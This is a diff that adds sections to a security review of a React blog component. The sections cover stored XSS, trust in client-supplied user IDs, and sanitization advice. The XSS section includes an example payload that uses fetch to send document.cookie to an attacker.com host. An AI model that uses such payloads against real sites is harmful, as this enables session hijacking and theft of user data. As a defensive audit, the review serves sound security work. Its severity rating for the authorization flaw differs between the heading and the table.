@@ -36,4 +36,49 @@ The component exhibits several areas of concern, primarily related to **Cross-Si
     ```
 
 **Analysis:**
-The component assumes that data retrieved
+The component assumes that data retrieved from the backend (`blogs` array) is inherently safe. However, if the underlying API (`getConsultantBlogs`) fails to properly sanitize or escape user-supplied data (e.g., if an attacker manages to inject `<script>alert('XSS')</script>` into their blog title or summary), this data will be rendered directly into the DOM.
+
+**Potential Payload:**
+*   **Stored XSS:** If an attacker posts a title like: `Great Article <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`
+*   **Impact:** This script would execute every time the `BlogPanel` component renders the list view, allowing session hijacking, unauthorized data exfiltration, or defacement.
+
+**Recommendation:**
+All user-generated content displayed to other users (titles, summaries, content) must be contextually encoded before rendering. While React generally handles escaping automatically for JSX interpolation (`{variable}`), if the component were ever refactored to use dangerouslySetInnerHTML, or if the data source itself is untrusted, manual sanitization (e.g., using a library like DOMPurify) should be enforced on both the client side (for display) and, crucially, the server side (for storage/retrieval).
+
+#### 2. API/Authorization Flaws (Medium Severity)
+
+**Affected Area:** Data fetching and submission (`fetchBlogs`, `handleSubmit`).
+**Vulnerable Objects:** `consultant.userId` / `(consultant as any).user_id`.
+**Vulnerable Code Location:**
+1.  **Fetching Blogs:**
+    ```tsx
+    const authorId = consultant.userId || (consultant as any).user_id;
+    // ...
+    const data = await getConsultantBlogs(authorId);
+    ```
+2.  **Creating Blog:**
+    ```tsx
+    await createBlog({ /* ... */ });
+    ```
+
+**Analysis:**
+The component assumes that `consultant` props passed to the component are trustworthy and belong to the currently authenticated user. If the component were ever used in a context where the `consultant` object could be manipulated client-side, an attacker might trick the application into fetching or creating resources belonging to another user by modifying the `consultant` object.
+
+**Mitigation (Server-Side Requirement):** **This vulnerability must be fully mitigated on the backend.** The backend API endpoints for fetching and creating resources *must* use the credentials of the *actual, authenticated session* (e.g., JWT token payload) to determine the resource owner, ignoring any `userId` provided by the client payload.
+
+#### 3. Client-Side Security Issues (File/Input Handling)
+
+**Vulnerability:** Potential for overly permissive file uploads or XSS if rich text editing is implemented.
+
+**Context:** While no file upload mechanism is visible, if the `title` or `content` fields were allowed to accept raw HTML (as is common with blog platforms), an attacker could inject malicious scripts.
+
+**Mitigation:** Always sanitize user-submitted rich text content (e.g., using libraries like DOMPurify) on the **server side** before saving the data to the database. Never trust client input.
+
+### Summary of Recommendations
+
+| Risk Area | Severity | Recommendation | Implementation Focus |
+| :--- | :--- | :--- | :--- |
+| **XSS in Display** | Medium | Sanitize *all* user-generated content (titles, content) upon rendering, even if it passed server validation. | Client-Side Rendering (React, Vue, etc.) |
+| **Authorization Bypass** | High | **Critical:** Ensure all API endpoints validate ownership against the authenticated session token, ignoring client-supplied IDs. | Server-Side Logic (Backend) |
+| **Data Validation** | Low/Medium | Strictly validate data types and lengths for all inputs on the server side. | Server-Side Logic (Backend) |
+| **Client-Side Security** | N/A | If implementing rich text, use dedicated sanitization libraries (e.g., DOMPurify) on the client and server. | Client/Server Both |
